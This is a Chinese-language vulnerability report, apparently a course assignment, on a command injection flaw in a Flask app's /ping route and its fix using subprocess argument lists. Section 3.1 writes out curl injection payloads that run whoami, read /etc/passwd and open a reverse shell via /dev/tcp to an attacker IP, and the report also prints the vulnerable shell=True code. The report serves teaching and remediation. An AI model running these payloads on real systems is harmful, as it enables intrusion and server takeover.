# 命令注入漏洞检测与修复报告

**项目名称：** 用户信息管理平台  
**评估日期：** 2026年7月26日  
**报告作者：** chilianzhe1470  
**仓库地址：** https://github.com/chilianzhe1470/Classrepair  
**密级：** 内部 — 仅限教学使用

---

## 1. 总体摘要

对 Flask 用户管理应用中的 **Ping 网络诊断功能**（`/ping`）进行了安全检测。该功能使用 `subprocess.check_output` 以 `shell=True` 模式执行拼接后的系统命令，存在 **严重的命令注入漏洞**，可导致远程代码执行（RCE）。

**检测结果：**

| 漏洞类型 | 严重程度 | CWE 编号 | 修复版状态 |
|---------|:--------:|:--------:|:----------:|
| 命令注入执行系统命令 | 🔴 严重 | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) | ✅ 已修复 |
| 命令注入读取敏感文件 | 🔴 严重 | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) | ✅ 已修复 |
| 命令注入反弹 Shell | 🔴 严重 | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) | ✅ 已修复 |

---

## 2. 新增功能说明

新增路由 `/ping` 支持网络连通性诊断：

| 属性 | 漏洞版(5000) | 修复版(8080) |
|------|:-----------:|:-----------:|
| 命令执行方式 | `shell=True` + f-string 拼接 | 参数列表 `["ping", "-c", "3", ip]` |
| 用户输入处理 | 直接拼接到命令字符串 | 作为参数传递给 ping 命令 |
| 是否存在 RCE | ❌ 存在 | ✅ 已修复 |
| CSRF 防护 | ❌ 无 | ✅ Flask-WTF |

---

## 3. 漏洞详情

### 3.1 V-CMD-01：命令注入执行任意命令

| 属性 | 内容 |
|------|------|
| **CWE 编号** | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) |
| **CVSS 3.1** | 9.8（严重） |
| **风险描述** | `/ping` 路由使用 `f"ping -c 3 {ip}"` 拼接命令字符串，配合 `shell=True` 启用 shell 解析。攻击者可在 IP 参数中使用 `;`、`&`、`|` 等 shell 特殊字符注入任意命令。 |

#### 攻击场景 1：执行系统命令

```bash
# 注入 whoami 命令
curl -s -X POST http://target:5000/ping -d "ip=127.0.0.1; whoami"
# 输出：root
# 说明成功执行了 whoami 命令
```

**实际执行的命令：**
```bash
ping -c 3 127.0.0.1; whoami
```

#### 攻击场景 2：读取敏感文件

```bash
# 读取 /etc/passwd
curl -s -X POST http://target:5000/ping -d "ip=127.0.0.1; head -1 /etc/passwd"
# 输出：root:x:0:0:root:/root:/bin/bash
```

#### 攻击场景 3：反弹 Shell

```bash
# 建立反向连接（假设攻击机 IP 为 1.2.3.4）
curl -s -X POST http://target:5000/ping \
  -d "ip=127.0.0.1; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
```

---

### 3.2 漏洞代码

```python
# ❌ 漏洞版 — shell=True + f-string 拼接
ip = request.form.get("ip", "")
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
```

---

### 3.3 修复方案

```python
# ✅ 修复版 — 参数列表方式，shell=False（默认）
ip = request.form.get("ip", "")
output = subprocess.check_output(
    ["ping", "-c", "3", ip],
    timeout=30,
    stderr=subprocess.STDOUT,
)
```

**原理：** 使用参数列表 `["ping", "-c", "3", ip]` 时，`subprocess` 不会启动 shell 解析器。即使 `ip` 中包含 `; whoami` 这样的字符串，它也会被当作**普通字符参数**传递给 `ping` 命令，不会被执行。

---

## 4. 检测过程与结果

### 4.1 测试工具

- **工具：** `curl` 命令行
- **目标漏洞版：** http://192.168.145.130:5000
- **目标修复版：** http://192.168.145.130:8080

### 4.2 测试结果

| # | 测试项 | 漏洞版(5000) | 修复版(8080) |
|:-:|:-------|:-----------:|:-----------:|
| 1 | 正常 Ping 127.0.0.1 | ✅ 成功（64 bytes） | ✅ 成功（64 bytes） |
| 2 | 注入 `; whoami` | ✅ 返回 `root`（RCE 成功） | ✅ 返回 `unknown host`（安全） |
| 3 | 注入 `; head -1 /etc/passwd` | ✅ 泄露系统用户 | ✅ 注入被拦截 |
| 4 | 无 CSRF Token 测试 | ✅ 仍可执行 | ✅ 400 拒绝 |

---

## 5. 代码对比

```diff
# ❌ 漏洞版 — 存在命令注入
- ip = request.form.get("ip", "")
- cmd = f"ping -c 3 {ip}"
- output = subprocess.check_output(cmd, shell=True, timeout=30)

# ✅ 修复版 — 参数列表方式，防止注入
+ ip = request.form.get("ip", "")
+ output = subprocess.check_output(
+     ["ping", "-c", "3", ip],
+     timeout=30, stderr=subprocess.STDOUT,
+ )
```

---

## 6. 安全建议

1. **永远不要使用 `shell=True`** — 除非绝对必要（几乎从不），始终使用参数列表方式调用 `subprocess`
2. **使用 `shlex.quote`** — 如必须拼接命令，用 `shlex.quote()` 转义用户输入（但参数列表仍是更优方案）
3. **输入白名单验证** — 对 IP 地址进行正则校验（但参数列表已足够安全）
4. **最小权限运行** — 应用使用非 root 用户运行，限制命令注入影响范围
5. **超时和资源限制** — 设置合理超时（已完成），限制并发执行数
6. **日志审计** — 记录所有 Ping 操作的用户、IP 和时间

---

## 7. 结论

本次评估发现并修复了 1 处命令注入漏洞：

| 漏洞类型 | CWE | CVSS | 状态 |
|---------|:---:|:----:|:----:|
| 命令注入 RCE | 78 | 9.8（严重） | ✅ 已修复 |

修复前，攻击者可通过 `; whoami` 在服务器上执行任意命令（实际测试返回 `root`），读取 `/etc/passwd` 等敏感文件，并可建立反弹 shell 完全控制服务器。修复后，用户输入始终作为普通参数传递给 `ping` 命令，即使包含 `;` 等特殊字符也不会被 shell 解析执行。

---

*本报告作为网络安全实训课程作业提交。所有测试均在授权环境下进行。*
